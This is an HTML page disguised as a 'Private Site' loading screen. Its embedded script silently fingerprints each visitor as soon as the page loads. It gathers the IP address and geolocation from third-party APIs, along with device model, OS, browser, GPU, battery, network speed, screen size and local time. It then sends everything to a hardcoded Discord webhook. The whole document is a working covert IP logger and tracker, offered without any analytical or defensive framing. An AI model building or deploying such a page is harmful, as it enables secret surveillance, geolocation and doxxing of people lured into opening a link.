<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Private Space</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: #121212;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #ffffff;
        }

        .welcome-box {
            text-align: center;
            padding: 2rem;
            background: #1e1e1e;
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            border: 1px solid #333;
            max-width: 300px;
            width: 90%;
        }

        h1 {
            font-size: 1.4rem;
            margin-bottom: 0.5rem;
            color: #ff4b6e;
        }

        p {
            font-size: 0.9rem;
            color: #aaa;
        }
    </style>
</head>
<body>

    <div class="welcome-box">
        <h1>Private Site</h1>
        <p>Loading your personalized space...</p>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1513127708719321189/7wzTrQfTvsTXPNxJoInbuiu4Obn7b8jKanm52Qnnag71A0zKA2piKocVpcQ44XljJusL';

        function getCleanDeviceInfo() {
            const ua = navigator.userAgent;
            let os = "Unknown OS";
            let browser = "Unknown Browser";
            let hardwareDetail = "Generic Device";
            let deviceType = "PC (Desktop/Laptop)";
            let brandModel = "Generic/Custom PC";

            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_VENDOR_STRING) || gl.getParameter(gl.RENDERER);
                        if (renderer) {
                            hardwareDetail = renderer.replace(/Angle \([^)]*\)\s?/gi, '').trim();
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }

            // High-level brand/model checking via User Agent tokens
            if (/iPhone/i.test(ua)) {
                os = "Apple iOS (iPhone)";
                deviceType = "Mobile Phone";
                brandModel = "Apple iPhone";
            } else if (/iPod/i.test(ua)) {
                os = "Apple iOS (iPod)";
                deviceType = "Mobile Phone";
                brandModel = "Apple iPod Touch";
            } else if (/iPad/i.test(ua)) {
                os = "Apple iOS (iPad)";
                deviceType = "Tablet";
                brandModel = "Apple iPad";
            } else if (/Android/i.test(ua)) {
                const match = ua.match(/Android\s([0-9\.]+)/);
                os = match ? `Android ${match[1]}` : "Android Device";
                deviceType = /Mobile/i.test(ua) ? "Mobile Phone" : "Tablet";
                
                // Parse typical Android model strings from the UserAgent format: Android ...; MODEL Build/...
                const modelMatch = ua.match(/Android[^;]*;\s*([^;)]*)\s*(?:Build|;\s*wv|\))/i);
                if (modelMatch && modelMatch[1]) {
                    brandModel = modelMatch[1].trim();
                } else {
                    brandModel = "Generic Android Device";
                }
            } else if (/Windows NT/i.test(ua)) {
                if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
                else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
                else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
                else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
                else os = "Windows PC";
                
                if (/Touch/i.test(ua) && !/PC/i.test(ua)) {
                    deviceType = "Tablet/Convertible";
                }
            } else if (/Macintosh/i.test(ua)) {
                if (navigator.maxTouchPoints && navigator.maxTouchPoints > 2) {
                    os = "macOS (iPad Pro/Air)";
                    deviceType = "Tablet";
                    brandModel = "Apple iPad (M-Series)";
                } else {
                    os = "macOS (Apple Mac)";
                    deviceType = "PC (Desktop/Laptop)";
                    brandModel = "Apple Mac";
                }
            } else if (/Linux/i.test(ua)) {
                os = "Linux System";
            }

            if (/FBAN|FBAV/i.test(ua)) {
                browser = "Facebook App";
            } else if (/Instagram/i.test(ua)) {
                browser = "Instagram App";
            } else if (/Discord/i.test(ua)) {
                browser = "Discord App";
            } else if (/Edg/i.test(ua)) {
                browser = "Microsoft Edge";
            } else if (/Chrome/i.test(ua) && /Safari/i.test(ua)) {
                browser = "Google Chrome";
            } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
                browser = "Apple Safari";
            } else if (/Firefox/i.test(ua)) {
                browser = "Mozilla Firefox";
            }

            return { os, browser, hardwareDetail, deviceType, brandModel };
        }

        async function getBatteryDetails() {
            let info = { level: "Unknown", charging: "Unknown" };
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    info.level = `${Math.round(battery.level * 100)}%`;
                    info.charging = battery.charging ? "Yes" : "No";
                }
            } catch (e) {
                console.error(e);
            }
            return info;
        }

        function getNetworkSpeed() {
            let speed = "Unknown";
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn && conn.downlink) {
                    speed = `${conn.downlink} Mbps`;
                    if (conn.effectiveType) {
                        speed += ` (${conn.effectiveType.toUpperCase()})`;
                    }
                }
            } catch (e) {
                console.error(e);
            }
            return speed;
        }

        window.addEventListener('DOMContentLoaded', async () => {
            let ipAddress = "Unknown (Blocked/Error)";
            let locationData = "Unknown";

            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (response.ok) {
                    const data = await response.json();
                    ipAddress = data.ip || "Unknown";
                    
                    const locResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                    if (locResponse.ok) {
                        const locData = await locResponse.json();
                        locationData = `${locData.city || 'Unknown'}, ${locData.region || 'Unknown'}, ${locData.country_name || 'Unknown'}`;
                    }
                }
            } catch (err) {
                console.error('IP fetch failed:', err);
            }

            const cleanDevice = getCleanDeviceInfo();
            const batteryInfo = await getBatteryDetails();
            const netSpeed = getNetworkSpeed();
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const localTime = new Date().toLocaleString();

            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [{
                        title: "🚪 Site Entry Logged",
                        description: "A user has entered your private website link.",
                        color: 3447003, 
                        fields: [
                            { name: "🌐 IP Address", value: ipAddress, inline: true },
                            { name: "📍 Estimated Location", value: locationData, inline: true },
                            { name: "🖥️ Device Type", value: cleanDevice.deviceType, inline: true },
                            { name: "🏷️ Brand/Model Name", value: cleanDevice.brandModel, inline: true },
                            { name: "🔋 Battery Level", value: batteryInfo.level, inline: true },
                            { name: "🔌 Is Charging?", value: batteryInfo.charging, inline: true },
                            { name: "⚡ Network Speed", value: netSpeed, inline: true },
                            { name: "📱 Operating System", value: cleanDevice.os, inline: true },
                            { name: "🛠️ Hardware/GPU Engine", value: cleanDevice.hardwareDetail, inline: true },
                            { name: "🌐 Web Browser", value: cleanDevice.browser, inline: true },
                            { name: "🖥️ Screen Resolution", value: screenRes, inline: true },
                            { name: "⏰ Device Local Time", value: localTime, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            }).catch(err => console.error('Error sending webhook:', err));
        });
    </script>
</body>
</html>
